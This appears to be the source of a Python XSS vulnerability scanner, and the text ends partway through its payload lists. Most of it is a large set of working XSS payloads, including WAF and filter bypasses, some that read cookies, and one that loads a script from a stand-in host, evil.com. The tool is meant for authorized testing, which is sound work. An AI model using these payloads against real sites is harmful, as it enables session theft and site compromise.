#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║  XSS Hunter Pro v3.0 — Advanced Cross-Site Scripting Scanner       ║
║  Reflected · Stored · Blind · Header · DOM XSS Detection           ║
║  CSP Analysis · WAF Fingerprint · Encoding Retry · Param Discovery ║
║  Author: Vishal — For authorized penetration testing only.         ║
╚══════════════════════════════════════════════════════════════════════╝

Single-file tool. Run:
    python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl
"""

# ═══════════════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════════════
import sys, os, re, time, json, csv, hashlib, random, string, argparse
import smtplib, ssl, logging, datetime, threading
from collections import deque, OrderedDict
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import List, Dict, Set, Tuple, Optional
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import requests
    import urllib3
    from requests.auth import HTTPBasicAuth
    from bs4 import BeautifulSoup
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"\n  ✗ Missing dependency: {e}")
    print("  Run: pip3 install requests beautifulsoup4 lxml colorama\n")
    sys.exit(1)

try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    # Stub out colorama if not installed
    class _Stub:
        def __getattr__(self, _): return ''
    Fore = Back = Style = _Stub()
    def colorama_init(**kw): pass


# ═══════════════════════════════════════════════════════════════════════
# PRETTY TERMINAL UI
# ═══════════════════════════════════════════════════════════════════════

RESET = Style.RESET_ALL if hasattr(Style, 'RESET_ALL') else ''

def banner():
    b = f"""
{Fore.RED}{Style.BRIGHT}
    ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
     ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
     ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{RESET}
    {Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}{Style.BRIGHT}XSS Hunter Pro v3.0{RESET}{Fore.CYAN}  │  Advanced XSS Vulnerability Scanner  ║
    ║  {Fore.WHITE}Reflected • Stored • Blind • Header{RESET}{Fore.CYAN} │  Context-Aware Engine  ║
    ║  {Fore.WHITE}CSP Analysis • WAF Fingerprint • Encoding Retry{RESET}{Fore.CYAN}              ║
    ╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(b)

def section(title, icon="═"):
    w = 66
    print(f"\n{Fore.CYAN}    ╔{'═'*w}╗")
    print(f"    ║  {Fore.WHITE}{Style.BRIGHT}{title}{RESET}{Fore.CYAN}{' '*(w-len(title)-2)}║")
    print(f"    ╚{'═'*w}╝{RESET}")

def info(msg):    print(f"    {Fore.GREEN}[✦]{RESET} {msg}")
def warn(msg):    print(f"    {Fore.YELLOW}[⚠]{RESET} {msg}")
def error(msg):   print(f"    {Fore.RED}[✗]{RESET} {msg}")
def success(msg): print(f"    {Fore.GREEN}{Style.BRIGHT}[✓]{RESET} {Fore.GREEN}{msg}{RESET}")
def vuln_msg(msg):print(f"    {Fore.RED}{Style.BRIGHT}[🔥 VULN]{RESET} {Fore.RED}{Style.BRIGHT}{msg}{RESET}")
def scan_msg(msg):print(f"    {Fore.BLUE}[→]{RESET} {msg}")
def dim(msg):     print(f"    {Fore.WHITE}{Style.DIM}{msg}{RESET}")

def table_header(cols, widths):
    """Print a pretty table header."""
    border = "    ┌" + "┬".join("─"*w for w in widths) + "┐"
    header = "    │" + "│".join(f"{Fore.CYAN}{Style.BRIGHT}{c.center(w)}{RESET}" for c, w in zip(cols, widths)) + "│"
    sep    = "    ├" + "┼".join("─"*w for w in widths) + "┤"
    print(border)
    print(header)
    print(sep)

def table_row(cells, widths, colors=None):
    """Print a table row."""
    parts = []
    for i, (cell, w) in enumerate(zip(cells, widths)):
        txt = str(cell)[:w-2]
        c = colors[i] if colors and i < len(colors) else ''
        parts.append(f"{c}{txt.ljust(w)}{RESET}")
    print("    │" + "│".join(parts) + "│")

def table_footer(widths):
    print("    └" + "┴".join("─"*w for w in widths) + "┘")

def progress_bar(current, total, width=40, label=""):
    pct = current / total if total else 0
    filled = int(width * pct)
    bar = f"{Fore.GREEN}{'█'*filled}{Fore.WHITE}{'░'*(width-filled)}{RESET}"
    sys.stdout.write(f"\r    {bar} {pct*100:5.1f}% ({current}/{total}) {label}  ")
    sys.stdout.flush()
    if current >= total:
        print()


# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════
STATIC_EXT = {'jpg','jpeg','png','gif','svg','ico','bmp','webp','css','woff','woff2',
              'ttf','eot','otf','mp3','mp4','avi','mov','wmv','flv','webm','pdf','doc',
              'docx','xls','xlsx','ppt','pptx','zip','rar','gz','tar','7z','exe','msi','dmg'}

def normalize_url(url):
    p = urlparse(url)
    return urlunparse((p.scheme, p.netloc, p.path.rstrip('/'), p.params, p.query, ''))

def is_same_domain(url, base):
    try:
        a, b = urlparse(url).netloc, urlparse(base).netloc
        return a == b or a.endswith('.'+b)
    except: return False

def extract_base_url(url):
    p = urlparse(url); return f"{p.scheme}://{p.netloc}"

def get_url_params(url):
    return parse_qs(urlparse(url).query, keep_blank_values=True)

def replace_url_param(url, param, value):
    p = urlparse(url)
    params = parse_qs(p.query, keep_blank_values=True)
    params[param] = [value]
    q = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment))

def uid(n=8): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))
def canary(prefix="xss"): return f"{prefix}{uid(12)}"
def is_static(url):
    path = urlparse(url).path
    return path.split('.')[-1].lower() in STATIC_EXT if '.' in path.split('/')[-1] else False

def clean_url(url):
    if not url.startswith(('http://','https://')): url = 'http://' + url
    return url

def is_valid_url(url):
    try:
        r = urlparse(url); return all([r.scheme in ('http','https'), r.netloc])
    except: return False

def html_esc(t):
    if not t: return ''
    return str(t).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

def trunc(s, n=80): return s if len(s)<=n else s[:n-3]+'...'


# ═══════════════════════════════════════════════════════════════════════
# PAYLOADS DATABASE — 5000+ organized by bypass category
# Categories:
#   BASIC_PAYLOADS          — standard classic XSS
#   ENCODING_PAYLOADS       — HTML/URL/Unicode/hex encoded
#   WAF_BYPASS_PAYLOADS     — WAF evasion techniques
#   ATTRIBUTE_ESCAPE        — breaking out of HTML attributes
#   SCRIPT_ESCAPE           — breaking out of JS strings/blocks
#   COMMENT_ESCAPE          — breaking out of HTML/JS comments
#   DOM_PAYLOADS            — DOM-based XSS sinks
#   SVG_PAYLOADS            — SVG-specific injection
#   EVENT_HANDLER_PAYLOADS  — every possible event handler
#   POLYGLOT_PAYLOADS       — work in multiple contexts at once
#   CSS_PAYLOADS            — CSS injection based XSS
#   TEMPLATE_INJECTION      — Angular/Vue/AngularJS template contexts
#   PROTOCOL_PAYLOADS       — javascript: / data: / vbscript: URIs
#   MUTATION_PAYLOADS       — browser mutation/quirks based
#   FILTER_BYPASS_PAYLOADS  — bypassing blacklist filters
#   NULL_BYTE_PAYLOADS      — null byte / truncation tricks
#   STORED_XSS_PAYLOADS     — better payloads for stored contexts
#   BLIND_TEMPLATES         — out-of-band callbacks
#   INJECTABLE_HEADERS      — HTTP header injection list
# ═══════════════════════════════════════════════════════════════════════

# ── BASIC PAYLOADS ───────────────────────────────────────────────────
BASIC_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    "<script>alert('XSS')</script>",
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(window.origin)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>confirm(1)</script>',
    '<script>confirm("XSS")</script>',
    '<script>prompt(1)</script>',
    '<script>prompt("XSS")</script>',
    '<script>console.log(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("XSS")>',
    "<img src=x onerror=alert('XSS')>",
    '<img src=x onerror=alert(document.domain)>',
    '<img src=x onerror=confirm(1)>',
    '<img src=x onerror=prompt(1)>',
    '<img/src=x onerror=alert(1)>',
    '<img /src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<img src=1 onerror=alert(1)>',
    '<img src onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg onload=confirm(1)>',
    "<svg onload=alert('1')>",
    '<svg><script>alert(1)</script></svg>',
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onhashchange=alert(1)>',
    '<body onfocus=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<input onfocus="alert(1)" autofocus>',
    '<input autofocus onfocus=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<details open ontoggle="alert(1)">',
    '<marquee onstart=alert(1)>',
    '<marquee loop=1 width=0 onfinish=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<video><source onerror=alert(1)></video>',
    '<audio src=x onerror=alert(1)>',
    '<audio autoplay onerror=alert(1)>',
    '<iframe onload=alert(1)>',
    '<iframe onload="alert(1)">',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<a href=javascript:alert(1)>click</a>',
    '<div onmouseover=alert(1)>hover</div>',
    '<div onclick=alert(1)>click</div>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">click</button></form>',
    '<math><mtext></mtext></math><script>alert(1)</script>',
    '<table><td background="javascript:alert(1)">',
    '<link rel=import href="javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
    '<script>window.onload=function(){alert(1)}</script>',
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
    '<script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<xss id=x tabindex=1 onfocusin=alert(1)></xss>',
    '<div id="x" style="position:fixed;top:0;left:0;width:100%;height:100%" onclick=alert(1)></div>',
    '<form id=x></form><button form=x formaction="javascript:alert(1)">click</button>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<isindex action="javascript:alert(1)" type=image>',
    '<frameset onload=alert(1)>',
    '<script>alert(/XSS/)</script>',
    '<script>alert(/XSS/.source)</script>',
    '<script>(function(){alert(1)})()</script>',
    '<script>!function(){alert(1)}()</script>',
    '<script>+function(){alert(1)}()</script>',
    '<script>void function(){alert(1)}()</script>',
    '<script>~function(){alert(1)}()</script>',
    '<script>typeof function(){alert(1)}()</script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<Script>alert(1)</Script>',
    '<sCrIpT>alert(1)</sCrIpT>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<SVG ONLOAD=alert(1)>',
]

# ── ENCODING PAYLOADS ─────────────────────────────────────────────────
ENCODING_PAYLOADS = [
    # HTML entity decimal
    '<script>alert(&#49;)</script>',
    '<script>alert(&#x31;)</script>',
    '<script>&#97;&#108;&#101;&#114;&#116;(1)</script>',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    # Mixed case
    '<ScRiPt>alert(1)</ScRiPt>',
    '<sCrIpT>alert(1)</sCrIpT>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<SCRipt>alert(1)</SCRipt>',
    '<scrIPT>alert(1)</scrIPT>',
    # URL encoded
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '%3Cimg+src%3Dx+onerror%3Dalert(1)%3E',
    '%3Csvg+onload%3Dalert(1)%3E',
    # Double URL encoded
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    '%253Csvg%2520onload%253Dalert%25281%2529%253E',
    # Unicode escapes in JS
    '<script>\\u0061lert(1)</script>',
    '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
    '<script>\\x61lert(1)</script>',
    '<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>',
    # Template literal
    '<script>alert`1`</script>',
    '<svg onload=alert`1`>',
    '<img src=x onerror=alert`1`>',
    # Base64
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>',
    '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>',
    # fromCharCode variants
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(String.fromCharCode(49))</script>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    # Hex entities
    '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
    # Newlines in tags
    "<img\nsrc=x\nonerror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    "<img\rsrc=x\ronerror=alert(1)>",
    "<img\x00src=x onerror=alert(1)>",
    # UTF-7
    '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    # Overlong UTF-8 (browser quirk)
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    # HTML comment bypass
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    # Null-separated
    '<s\x00cript>alert(1)</script>',
    # Obfuscated via encoded event
    '<img src=x o\x00nerror=alert(1)>',
    '<img src=x on\x00error=alert(1)>',
    # CSS expression (IE)
    '<div style="width:expression(alert(1))">',
    '<xss style="xss:expression(alert(1))">',
    # Object: src
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    # Char code constructs
    '<script>window["al"+"ert"](1)</script>',
    '<script>this["al"+"ert"](1)</script>',
    '<script>self["alert"](1)</script>',
    '<script>top["alert"](1)</script>',
    '<script>frames["alert"](1)</script>',
    '<script>content["alert"](1)</script>',
]

# ── WAF BYPASS PAYLOADS ───────────────────────────────────────────────
WAF_BYPASS_PAYLOADS = [
    # Throw-based (no parentheses needed)
    '<script>onerror=alert;throw 1</script>',
    '<script>throw onerror=alert,1</script>',
    '<script>onerror=confirm;throw 1</script>',
    '<script>onerror=prompt;throw 1</script>',
    # Function constructor
    '<script>Function("alert(1)")()</script>',
    '<script>new Function("alert(1)")()</script>',
    '<script>[].constructor.constructor("alert(1)")()</script>',
    '<script>{}.constructor.constructor("alert(1)")()</script>',
    "<script>''.constructor.constructor('alert(1)')()</script>",
    '<script>(0)[\'constructor\'][\'constructor\'](\'alert(1)\')()</script>',
    # setTimeout/setInterval
    '<script>setTimeout("alert(1)",0)</script>',
    '<script>setInterval("alert(1)",0)</script>',
    '<script>setTimeout(alert,0,1)</script>',
    '<script>setTimeout`alert\x281\x29`</script>',
    # eval variants
    '<script>eval("ale"+"rt(1)")</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<script>eval(unescape("%61%6C%65%72%74%281%29"))</script>',
    '<script>eval(decodeURIComponent("%61%6C%65%72%74%281%29"))</script>',
    # window property access
    "<img src=x onerror=\"window['al'+'ert'](1)\">",
    "<img src=x onerror=\"window['alert'](1)\">",
    '<img src=x onerror="self[`al`+`ert`](1)">',
    '<img src=x onerror="top[`alert`](1)">',
    # Attribute injection breakouts
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '"><iframe onload=alert(1)>',
    '"><details open ontoggle=alert(1)>',
    # Minus signs / operator tricks
    '"-alert(1)-"',
    "'-alert(1)-'",
    '`-alert(1)-`',
    '"-confirm(1)-"',
    # Template injection style
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    # Script tag splitting
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<scr<ScRiPt>ipt>alert(1)</scr<ScRiPt>ipt>',
    # Embedded newlines/tabs in tags
    '<svg\r\nonload\r\n=\r\nalert(1)>',
    '<svg\tonload=alert(1)>',
    '<svg\nonload=alert(1)>',
    # Extra attributes after event
    '<svg/onload=alert(1)//>',
    '<img src="x" OnErRoR="alert(1)">',
    # onanimationstart/onanimationend via CSS
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>',
    # ontransitionend
    '<style>*{transition:outline 1s}</style><xss ontransitionend=alert(1) style="outline:0;outline:5px solid red">',
    # onfocusin
    '<input onfocusin=alert(1) autofocus>',
    # srcdoc
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">',
    # data-uri iframe
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    # Mutation-based
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    # caret notation
    '<s^cript>alert(1)</s^cript>',
    # object data
    '<object data="javascript:alert(1)">',
    # applet
    '<applet code="javascript:alert(1)">',
    # link stylesheet
    '<link rel=stylesheet href="data:text/css,*{background:url(\'javascript:alert(1)\')}">',
    # mXSS via innerHTML
    '<img src=x onerror=location=`java`+`script:alert`+`(1)`>',
    # Encoded angle brackets via UTF
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    '\u003cimg src=x onerror=alert(1)\u003e',
    # Backtick template in handler
    '<svg onload=`alert(1)`>',
    '<img src=x onerror=`alert(1)`>',
    # Arrow function
    '<script>window.onload=()=>alert(1)</script>',
    # Prototype pollution context
    '<script>Object.prototype.innerHTML="<img src=x onerror=alert(1)>"</script>',
    # import()
    '<script>import("data:text/javascript,alert(1)")</script>',
    # Dynamic import
    '<script>import(/* @vite-ignore */ "data:text/javascript,alert(1)")</script>',
    # No-quotes bypass
    '<script>alert(document.cookie)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(location.href)</script>',
    # Percent encoding of event name
    '<img src=x %6Fnerror=alert(1)>',
    # Double-encoded script src
    '<script/src=data:,alert(1)></script>',
    # Closing tag confusion
    '</title><script>alert(1)</script>',
    '</textarea><script>alert(1)</script>',
    '</style><script>alert(1)</script>',
    '</script><script>alert(1)</script>',
    '</noscript><script>alert(1)</script>',
    '</template><script>alert(1)</script>',
]

# ── ATTRIBUTE ESCAPE PAYLOADS ─────────────────────────────────────────
ATTRIBUTE_ESCAPE = [
    # Double-quote escapes
    '" onmouseover="alert(1)" x="',
    '" onfocus="alert(1)" autofocus x="',
    '" onblur="alert(1)" autofocus x="',
    '" onclick="alert(1)" x="',
    '" ondblclick="alert(1)" x="',
    '" onkeypress="alert(1)" x="',
    '" onkeydown="alert(1)" x="',
    '" onkeyup="alert(1)" x="',
    '" onmousedown="alert(1)" x="',
    '" onmouseup="alert(1)" x="',
    '" onmouseenter="alert(1)" x="',
    '" onmouseleave="alert(1)" x="',
    '" oncontextmenu="alert(1)" x="',
    '" onchange="alert(1)" x="',
    '" oninput="alert(1)" x="',
    '" onselect="alert(1)" x="',
    '" ondrag="alert(1)" x="',
    '" ondrop="alert(1)" x="',
    '" onpaste="alert(1)" x="',
    '" oncut="alert(1)" x="',
    '" oncopy="alert(1)" x="',
    '" onwheel="alert(1)" x="',
    '" onscroll="alert(1)" x="',
    '" onload="alert(1)" x="',
    '" onerror="alert(1)" x="',
    '" onanimationstart="alert(1)" x="',
    '" ontransitionend="alert(1)" x="',
    '" onpointerdown="alert(1)" x="',
    '" onpointerup="alert(1)" x="',
    '" onpointermove="alert(1)" x="',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '"><details open ontoggle=alert(1)>',
    '"><iframe onload=alert(1)>',
    '"><body onload=alert(1)>',
    '"><input onfocus=alert(1) autofocus>',
    '"><a href=javascript:alert(1)>click</a>',
    '" href="javascript:alert(1)" x="',
    '" src="javascript:alert(1)" x="',
    '" action="javascript:alert(1)" x="',
    '" formaction="javascript:alert(1)" x="',
    # Single-quote escapes
    "' onmouseover='alert(1)' x='",
    "' onfocus='alert(1)' autofocus x='",
    "' onclick='alert(1)' x='",
    "' ondblclick='alert(1)' x='",
    "' onblur='alert(1)' x='",
    "' onkeypress='alert(1)' x='",
    "' onkeydown='alert(1)' x='",
    "' onmousedown='alert(1)' x='",
    "' onmouseup='alert(1)' x='",
    "' onchange='alert(1)' x='",
    "' oninput='alert(1)' x='",
    "' onload='alert(1)' x='",
    "' onerror='alert(1)' x='",
    "' onpointerdown='alert(1)' x='",
    "' onpointermove='alert(1)' x='",
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "'><details open ontoggle=alert(1)>",
    "'><iframe onload=alert(1)>",
    "' href='javascript:alert(1)' x='",
    "' src='javascript:alert(1)' x='",
    "' formaction='javascript:alert(1)' x='",
    # Unquoted attribute escape
    ' onmouseover=alert(1) ',
    ' onfocus=alert(1) autofocus ',
    ' onclick=alert(1) ',
    ' onkeypress=alert(1) ',
    ' onmousedown=alert(1) ',
    ' onerror=alert(1) ',
    ' onload=alert(1) ',
    '><script>alert(1)</script>',
    '><img src=x onerror=alert(1)>',
    '><svg onload=alert(1)>',
    # href/src/action value
    'javascript:alert(1)',
    'javascript:alert(document.cookie)',
    'javascript:confirm(1)',
    'javascript:prompt(1)',
    'javascript:void(alert(1))',
    'JaVaScRiPt:alert(1)',
    'JAVASCRIPT:alert(1)',
    '\tjavascript:alert(1)',
    '\njavascript:alert(1)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    'java&#9;script:alert(1)',
    'java&#10;script:alert(1)',
    'java&#13;script:alert(1)',
    # data URIs
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:text/html,<img src=x onerror=alert(1)>',
]

# ── SCRIPT CONTEXT ESCAPE ─────────────────────────────────────────────
SCRIPT_ESCAPE = [
    # Double-quote string break
    '";alert(1);//',
    '"+alert(1)+"',
    '";alert(1);x="',
    '";alert(document.cookie);//',
    '"+alert(document.domain)+"',
    '";confirm(1);//',
    '";prompt(1);//',
    '";window.location="javascript:alert(1)";//',
    # Single-quote string break
    "';alert(1);//",
    "'+alert(1)+'",
    "';alert(1);x='",
    "';alert(document.cookie);//",
    "'+alert(document.domain)+'",
    "';confirm(1);//",
    "';prompt(1);//",
    # Backtick break
    '`;alert(1);//',
    '`+alert(1)+`',
    # Close script block and inject new
    '</script><script>alert(1)</script>',
    '</script><img src=x onerror=alert(1)>',
    '</script><svg onload=alert(1)>',
    '</script><iframe onload=alert(1)>',
    '</script><details open ontoggle=alert(1)>',
    # Template literal / expression injection
    '${alert(1)}',
    '${alert(document.cookie)}',
    '${confirm(1)}',
    '`${alert(1)}`',
    '#{alert(1)}',
    # Comment-based injection
    '/*</script><script>alert(1)</script>*/',
    '//</script>\n<script>alert(1)</script>',
    # JSON break
    '"}};alert(1);//',
    '"}}; alert(1);//',
    '"}}); alert(1); //',
    '}});alert(1);//',
    # JSONP callback injection
    'alert(1);//',
    'confirm(1);//',
    'prompt(1);//',
    # setTimeout/setInterval string context
    '",alert(1)//',
    "',alert(1)//",
    # Inline function injection
    '");alert(1);//',
    "');alert(1);//",
    # Object property break
    '",x:alert(1),"',
    "',x:alert(1),'",
    # RegEx literal confuse
    '/x/;alert(1);//',
]

# ── COMMENT ESCAPE PAYLOADS ───────────────────────────────────────────
COMMENT_ESCAPE = [
    # HTML comment
    '--><script>alert(1)</script>',
    '--><img src=x onerror=alert(1)>',
    '--><svg onload=alert(1)>',
    '--><details open ontoggle=alert(1)>',
    '--><iframe onload=alert(1)>',
    '--><input onfocus=alert(1) autofocus>',
    '<!--><script>alert(1)</script>',
    '<!-–><script>alert(1)</script>',
    # JS line comment
    '\n<script>alert(1)</script>',
    '\n<img src=x onerror=alert(1)>',
    '\n<svg onload=alert(1)>',
    # JS block comment
    '*/<script>alert(1)</script>',
    '*/<img src=x onerror=alert(1)>',
    '*/<svg onload=alert(1)>',
    # Conditional comment (IE)
    '<![endif]--><script>alert(1)</script>',
    '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
    # CDATA escape (XML/SVG)
    ']]></script><script>alert(1)</script>',
    ']]><img src=x onerror=alert(1)>',
]

# ── DOM-BASED XSS PAYLOADS ────────────────────────────────────────────
DOM_PAYLOADS = [
    # location-based sinks
    '<script>location=`javascript:alert\x281\x29`</script>',
    '<script>location.href="javascript:alert(1)"</script>',
    '<script>location.assign("javascript:alert(1)")</script>',
    '<script>location.replace("javascript:alert(1)")</script>',
    # document.write sinks
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
    '<script>document.writeln("<svg onload=alert(1)>")</script>',
    # innerHTML sink
    '<img src=x onerror="document.body.innerHTML=\'<script>alert(1)<\\/script>\'">',
    # outerHTML sink
    '<img src=x onerror="this.outerHTML=\'<svg onload=alert(1)>\'">',
    # insertAdjacentHTML
    '<img src=x onerror="document.body.insertAdjacentHTML(\'beforeend\',\'<svg onload=alert(1)>\')">',
    # eval sinks
    '<script>eval(location.hash.slice(1))</script>',
    '<script>eval(location.search.slice(1))</script>',
    '<script>eval(document.referrer)</script>',
    # setTimeout/setInterval with string
    '<script>setTimeout(location.hash.slice(1),0)</script>',
    # DOM clobbering
    '<form id=x><input id=y name=z value="alert(1)"></form><script>document.getElementById("x").z.value</script>',
    # window.name sink
    '<script>eval(window.name)</script>',
    # postMessage
    '<script>window.addEventListener("message",function(e){eval(e.data)})</script>',
    # hash-based
    '<script>if(location.hash)eval(decodeURIComponent(location.hash.slice(1)))</script>',
    # jquery html()
    '<img src=x onerror=$.globalEval("alert(1)")>',
    # angular ng-app template (AngularJS < 1.6)
    '<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>',
    # vue template
    '<div id=app>{{constructor.constructor("alert(1)")()}}</div>',
    # handlebars-style
    '{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "alert(1)"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}',
    # srcdoc-based DOM
    '<iframe srcdoc="<script>parent.alert(1)<\\/script>">',
    # sandboxed iframe escape
    '<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>">',
    # XSS via URL fragment
    '<a href="#" onclick="eval(location.hash.slice(1))">click</a>',
    # base tag hijack
    '<base href="//evil.com/"><script src="/xss.js"></script>',
    # opener manipulation
    '<a href="javascript:window.opener&&window.opener.alert(1)">x</a>',
    # content editable
    '<div contenteditable="true" onpaste="alert(1)">paste here</div>',
    # execCommand
    '<div contenteditable><img src=x onerror=document.execCommand("insertText",false,"<img onerror=alert(1) src=x)")></div>',
    # mutation observer
    '<script>new MutationObserver(function(){alert(1)}).observe(document,{childList:true,subtree:true})</script>',
    '<div id=x></div><script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>',
]

# ── SVG PAYLOADS ──────────────────────────────────────────────────────
SVG_PAYLOADS = [
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload="alert(1)">',
    "<svg onload='alert(1)'>",
    '<svg onload=alert`1`>',
    '<svg onload=confirm(1)>',
    '<svg onload=prompt(1)>',
    '<svg onload=alert(document.domain)>',
    '<svg onload=alert(document.cookie)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><script>alert&#40;1&#41;</script></svg>',
    '<svg><script>alert&#x28;1&#x29;</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    '<svg><animateColor onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>',
    '<svg><animateMotion onbegin=alert(1) dur=1s>',
    '<svg><discard onbegin=alert(1)>',
    '<svg><use href="javascript:alert(1)">',
    '<svg><use xlink:href="javascript:alert(1)">',
    '<svg><a xlink:href="javascript:alert(1)"><text x=1 y=1>click</text></a></svg>',
    '<svg><a href="javascript:alert(1)"><text x=1 y=1>click</text></a></svg>',
    '<svg><image href="x" onerror="alert(1)"/>',
    '<svg><image xlink:href="x" onerror="alert(1)"/>',
    '<svg><foreignObject><iframe onload=alert(1)></iframe></foreignObject></svg>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
